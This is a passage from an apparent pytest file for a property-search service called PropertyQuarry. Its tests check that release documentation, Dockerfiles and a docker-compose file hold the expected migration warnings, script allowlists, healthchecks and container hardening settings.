            "### Mandatory contained cutover for schema v11 and admission schema v15\n",
            1,
        )[1]
        .split("## Disposable development and test targets\n", 1)[0]
        .split()
    )

    for required in (
        "Writer contract 3 and schema v11 are deliberately not rolling-compatible",
        "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET",
        "property_search_erasure_key_mismatch",
        "stop every API, worker, scheduler, and render/publication writer",
        "From live schema v9 this applies v10 and v11 in the same migration transaction",
        "homogeneous schema-v11/contract-3 fleet",
        "fresh per-instance heartbeats for the complete expected role manifest",
        "never restart a contract-2 binary after v11",
        "Changing the erasure secret is a separately designed key migration",
    ):
        assert required in cutover

    env_example = _read(".env.example")
    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET=" in env_example
    assert "Do not rotate it without a governed database key migration" in env_example


def test_environment_matrix_separates_local_compose_from_production_handoff() -> None:
    matrix = _read("ENVIRONMENT_MATRIX.md")

    assert "docker-compose.property.yml` directly only for a disposable local development target" in matrix
    assert "EA_RUNTIME_MODE=dev" in matrix
    assert "`make deploy` invokes the unprivileged production handoff" in matrix
    assert "operation-bound signed request" in matrix
    assert "independently installed release controller" in matrix
    assert "Use `docker-compose.property.yml` or `make deploy`" not in matrix


def test_release_checklist_requires_distinct_preflight_and_deploy_requests() -> None:
    checklist = _read("RELEASE_CHECKLIST.md")

    assert "propertyquarry-deploy-preflight-request.json" in checklist
    assert "It must bind `deploy-preflight`, cannot authorize mutation" in checklist
    assert "never reused for deployment" in checklist
    assert "distinct fresh `deploy-run` request" in checklist
    assert "propertyquarry-deploy-run-request.json" in checklist


def test_runtime_hard_exit_gates_can_extend_into_propertyquarry_live_runtime() -> None:
    script = _read("scripts/runtime_hard_exit_gates.sh")
    smoke_help = _read("scripts/smoke_help.sh")

    for required in (
        "PROPERTYQUARRY_RUNTIME_GATES=1",
        "PROPERTYQUARRY_LIVE_SMOKE_BASE_URL",
        "PROPERTYQUARRY_LIVE_PROVIDER_SMOKE_PRINCIPAL_ID",
        "scripts/propertyquarry_live_public_smoke.py",
        "scripts/propertyquarry_live_authenticated_smoke.py",
        "scripts/property_live_provider_smoke.py",
        "PROPERTYQUARRY_LIVE_PROVIDER_SMOKE=1",
        "PROPERTYQUARRY_LIVE_PROVIDER_SMOKE_DRY_RUN=0",
        "verify_pocket_audio_archive.py failed, continuing because Pocket archive backfill is outside the PropertyQuarry runtime lane",
        "EA_API_TOKEN is not set; skipping authenticated/mobile/provider PropertyQuarry runtime smokes",
    ):
        assert required in script

    for required in (
        "scripts/deploy_propertyquarry.sh",
        "scripts/propertyquarry_live_public_smoke.py",
        "scripts/propertyquarry_live_authenticated_smoke.py",
        "scripts/property_live_provider_smoke.py",
    ):
        assert required in smoke_help


def test_property_dockerfile_allowlists_runtime_scripts() -> None:
    dockerfile = _read("ea/Dockerfile.property")

    assert "COPY . /tmp/src" not in dockerfile
    assert "COPY ea/requirements.txt /app/requirements.txt" in dockerfile
    assert "COPY ea/requirements.lock /app/requirements.lock" in dockerfile
    assert dockerfile.index("COPY ea/requirements.txt /app/requirements.txt") < dockerfile.index("pip install --no-cache-dir")
    assert dockerfile.index("pip install --no-cache-dir") < dockerfile.index("COPY ea/app /app/app")
    assert "COPY scripts/willhaben_property_packet.py /app/scripts/willhaben_property_packet.py" in dockerfile
    assert "COPY scripts/property_magicfit_env.py /app/scripts/property_magicfit_env.py" in dockerfile
    assert "COPY scripts/render_magicfit_property_flythrough.py /app/scripts/render_magicfit_property_flythrough.py" in dockerfile
    assert "COPY scripts/render_omagic_property_model_walkthrough.py /app/scripts/render_omagic_property_model_walkthrough.py" in dockerfile
    assert "COPY scripts/render_magicai_model_upload_adapter.py /app/scripts/render_magicai_model_upload_adapter.py" in dockerfile
    assert "COPY scripts/property_scene_video_readiness_report.py /app/scripts/property_scene_video_readiness_report.py" in dockerfile
    assert "COPY scripts/verify_property_scene_video_readiness.py /app/scripts/verify_property_scene_video_readiness.py" in dockerfile
    assert "COPY scripts/materialize_scene_video_provider_refresh_packet.py /app/scripts/materialize_scene_video_provider_refresh_packet.py" in dockerfile
    assert "COPY scripts/verify_scene_video_provider_refresh_packet.py /app/scripts/verify_scene_video_provider_refresh_packet.py" in dockerfile
    assert "COPY scripts/merge_scene_video_provider_accounts_env.py /app/scripts/merge_scene_video_provider_accounts_env.py" in dockerfile
    assert "COPY scripts/import_3dvista_export.py /app/scripts/import_3dvista_export.py" in dockerfile
    assert "COPY scripts/import_pano2vr_export.py /app/scripts/import_pano2vr_export.py" in dockerfile
    assert "COPY scripts/import_krpano_walkable_scene.py /app/scripts/import_krpano_walkable_scene.py" in dockerfile
    assert "COPY scripts/import_property_tour_exports.py /app/scripts/import_property_tour_exports.py" in dockerfile
    assert "COPY scripts/attach_provider_tour_layer.py /app/scripts/attach_provider_tour_layer.py" in dockerfile
    assert "COPY scripts/materialize_property_tour_export_manifest.py /app/scripts/materialize_property_tour_export_manifest.py" in dockerfile
    assert "COPY scripts/property_tour_runtime_paths.py /app/scripts/property_tour_runtime_paths.py" in dockerfile
    assert "COPY scripts/generate_property_reconstruction.py /app/scripts/generate_property_reconstruction.py" in dockerfile
    assert "COPY scripts/property_reconstruction_render_bridge.py /app/scripts/property_reconstruction_render_bridge.py" in dockerfile
    assert "COPY scripts/import_magicfit_walkthrough.py /app/scripts/import_magicfit_walkthrough.py" in dockerfile
    assert "COPY scripts/verify_property_tour_controls.py /app/scripts/verify_property_tour_controls.py" in dockerfile
    assert "COPY scripts/property_tour_3dvista_provenance.py /app/scripts/property_tour_3dvista_provenance.py" in dockerfile
    assert "COPY scripts/verify_property_tour_vendor_tooling.py /app/scripts/verify_property_tour_vendor_tooling.py" in dockerfile
    assert "COPY scripts/intake_3dvista_gold_artifact.py /app/scripts/intake_3dvista_gold_artifact.py" in dockerfile
    assert "PLAYWRIGHT_BROWSERS_PATH=/ms-playwright" in dockerfile
    assert "python -m playwright install --with-deps chromium" in dockerfile
    assert "for script in /tmp/src/scripts/*" not in dockerfile
    assert 'for script in "$APP_SRC"/scripts/*' not in dockerfile
    assert 'cp "$script" /app/scripts/' not in dockerfile
    assert "build_propertyquarry_magicfit_promo.py" not in dockerfile


def test_runtime_dockerfiles_fail_closed_for_worker_and_scheduler_health() -> None:
    for path in ("Dockerfile", "ea/Dockerfile", "ea/Dockerfile.property"):
        dockerfile = _read(path)
        healthcheck = dockerfile[dockerfile.index("HEALTHCHECK") :]

        assert 'worker|scheduler) exec python -m app.scheduler_healthcheck' in healthcheck
        assert 'worker|scheduler) exit 0' not in healthcheck


def test_property_web_dockerfile_keeps_reconstruction_lightweight_and_excludes_browser_payloads() -> None:
    dockerfile = _read("ea/Dockerfile.property-web")

    assert "COPY . /tmp/src" not in dockerfile
    assert "COPY ea/requirements.txt /app/requirements.txt" in dockerfile
    assert "COPY ea/requirements.lock /app/requirements.lock" in dockerfile
    assert "COPY scripts/willhaben_property_packet.py /app/scripts/willhaben_property_packet.py" in dockerfile
    assert "COPY scripts/render_magicfit_property_flythrough.py /app/scripts/render_magicfit_property_flythrough.py" in dockerfile
    assert "COPY scripts/render_onemin_property_i2v_segment.py /app/scripts/render_onemin_property_i2v_segment.py" in dockerfile
    assert "COPY scripts/render_omagic_property_model_walkthrough.py /app/scripts/render_omagic_property_model_walkthrough.py" in dockerfile
    assert "COPY scripts/render_magicai_model_upload_adapter.py /app/scripts/render_magicai_model_upload_adapter.py" in dockerfile
    assert "COPY scripts/property_scene_video_readiness_report.py /app/scripts/property_scene_video_readiness_report.py" in dockerfile
    assert "COPY scripts/discover_property_tour_exports.py /app/scripts/discover_property_tour_exports.py" in dockerfile
    assert "COPY scripts/materialize_property_tour_export_manifest.py /app/scripts/materialize_property_tour_export_manifest.py" in dockerfile
    assert "COPY scripts/generate_property_reconstruction.py /app/scripts/generate_property_reconstruction.py" in dockerfile
    assert "COPY scripts/verify_property_tour_vendor_tooling.py /app/scripts/verify_property_tour_vendor_tooling.py" not in dockerfile
    assert "PLAYWRIGHT_BROWSERS_PATH=/ms-playwright" not in dockerfile
    assert "python -m playwright install --with-deps chromium" not in dockerfile
    assert "blender" not in dockerfile.lower()
    assert "colmap" not in dockerfile.lower()
    assert "meshlab" not in dockerfile.lower()
    assert "ffmpeg" not in dockerfile.lower()
    assert "espeak" not in dockerfile.lower()
    assert "imagemagick" not in dockerfile.lower()
    assert "libimage-exiftool-perl" not in dockerfile.lower()
    assert "for script in /tmp/src/scripts/*" not in dockerfile
    assert 'cp "$script" /app/scripts/' not in dockerfile


def test_property_runtime_copied_scripts_do_not_depend_on_fleet_paths() -> None:
    dockerfile = _read("ea/Dockerfile.property")
    copied_scripts = re.findall(r"COPY\s+scripts/([^\s]+)\s+/app/scripts/", dockerfile)

    assert copied_scripts == [
        "willhaben_property_packet.py",
        "property_magicfit_env.py",
        "mootion_movie_worker.py",
        "render_magicfit_property_flythrough.py",
        "render_onemin_property_i2v_segment.py",
        "render_omagic_property_model_walkthrough.py",
        "render_magicai_model_upload_adapter.py",
        "property_scene_video_readiness_report.py",
        "verify_property_scene_video_readiness.py",
        "materialize_scene_video_provider_refresh_packet.py",
        "verify_scene_video_provider_refresh_packet.py",
        "merge_scene_video_provider_accounts_env.py",
        "import_3dvista_export.py",
        "import_pano2vr_export.py",
        "import_krpano_walkable_scene.py",
        "import_property_tour_exports.py",
        "attach_provider_tour_layer.py",
        "discover_property_tour_exports.py",
        "materialize_property_tour_export_manifest.py",
        "property_tour_runtime_paths.py",
        "propertyquarry_playwright_runtime.py",
        "generate_property_reconstruction.py",
        "property_reconstruction_render_bridge.py",
        "import_magicfit_walkthrough.py",
        "verify_property_tour_controls.py",
        "property_tour_3dvista_provenance.py",
        "property_tour_panorama_provenance.py",
        "property_tour_host_safety.py",
        "verify_property_tour_vendor_tooling.py",
        "intake_3dvista_gold_artifact.py",
    ]
    for script_name in copied_scripts:
        body = _read(f"scripts/{script_name}")
        assert "/docker/fleet" not in body, script_name
        assert "/tmp/propertyquarry" not in body, script_name


def test_property_compose_container_names_are_recoverable() -> None:
    compose = _read("docker-compose.property.yml")

    assert "dockerfile: ea/Dockerfile.property-web" in compose
    assert 'image: "${PROPERTYQUARRY_WEB_IMAGE:-propertyquarry-web-runtime:latest}"' in compose
    assert "propertyquarry-render-tools:" in compose
    assert "dockerfile: ea/Dockerfile.property-render" in compose
    assert 'image: "${PROPERTYQUARRY_RENDER_IMAGE:-propertyquarry-render-runtime:latest}"' in compose
    assert 'container_name: "${PROPERTYQUARRY_API_CONTAINER_NAME:-propertyquarry-api}"' in compose
    assert 'container_name: "${PROPERTYQUARRY_WORKER_CONTAINER_NAME:-propertyquarry-worker}"' in compose
    assert 'container_name: "${PROPERTYQUARRY_SCHEDULER_CONTAINER_NAME:-propertyquarry-scheduler}"' in compose
    assert 'container_name: "${PROPERTYQUARRY_DB_CONTAINER_NAME:-propertyquarry-db-live}"' in compose
    assert 'container_name: "${PROPERTYQUARRY_RENDER_CONTAINER_NAME:-propertyquarry-render-tools}"' in compose
    assert compose.count("path: ./state/runtime/property_scene_video_shared.env") == 2
    assert compose.count(
        'PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET: "${PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET:-}"'
    ) == 4
    migration_section = compose.split("  propertyquarry-migrate:", 1)[1].split(
        "  propertyquarry-worker:", 1
    )[0]
    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET" in migration_section
    assert "property_scene_video_shared.env" not in migration_section
    assert "env_file:" not in migration_section
    assert "EA_ROLE: property-search-migrate" in migration_section
    assert 'command: ["python", "-m", "app.product.property_search_schema", "migrate"]' in migration_section
    assert 'restart: "no"' in migration_section
    worker_section = compose.split("  propertyquarry-worker:", 1)[1].split(
        "  propertyquarry-scheduler:", 1
    )[0]
    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET" in worker_section
    assert "property_scene_video_shared.env" not in worker_section
    assert 'PROPERTYQUARRY_WORKER_PROFILE: "property_only"' in worker_section
    assert 'PROPERTYQUARRY_SEARCH_SCHEMA_READINESS_REQUIRED: "1"' in worker_section
    assert 'test: ["CMD", "/usr/local/bin/python", "-m", "app.scheduler_healthcheck"]' in worker_section
    assert "\n    read_only: true\n" in worker_section
    assert "EA_SCHEDULER_HEARTBEAT_PATH: /data/artifacts/propertyquarry-scheduler-heartbeat.json" in compose
    assert 'EA_SCHEDULER_HEARTBEAT_MAX_AGE_SECONDS: "${EA_SCHEDULER_HEARTBEAT_MAX_AGE_SECONDS:-900}"' in compose
    assert 'test: ["CMD", "python", "-m", "app.scheduler_healthcheck"]' in compose
    scheduler_section = compose.split("  propertyquarry-scheduler:", 1)[1].split("  propertyquarry-db:", 1)[0]
    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET" in scheduler_section
    assert "disable: true" not in scheduler_section
    render_section = compose.split("  propertyquarry-render-tools:", 1)[1].split("  propertyquarry-db:", 1)[0]
    assert 'PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET: ""' in render_section
    assert "property_scene_video_shared.env" not in render_section
    assert "\n    env_file:" not in render_section
    assert "profiles:" not in render_section
    assert "- render-tools" not in render_section
    assert "\n    command:" not in render_section
    assert "\n    entrypoint:" not in render_section
    assert "\n    healthcheck:" not in render_section
    assert 'user: "10001:10001"' in render_section
    assert "\n    read_only: true\n" in render_section
    assert '"no-new-privileges:true"' in render_section
    assert 'PROPERTYQUARRY_RECONSTRUCTION_RENDER_HOST: "0.0.0.0"' in render_section
    assert (
        'PROPERTYQUARRY_RECONSTRUCTION_RENDER_BRIDGE_TOKEN: '
        '"${PROPERTYQUARRY_RECONSTRUCTION_RENDER_BRIDGE_TOKEN:?'
    ) in render_section
    assert "propertyquarry_public_tours:/data/public_property_tours" in render_section
    assert "http://127.0.0.1:8090/health/live" not in render_section
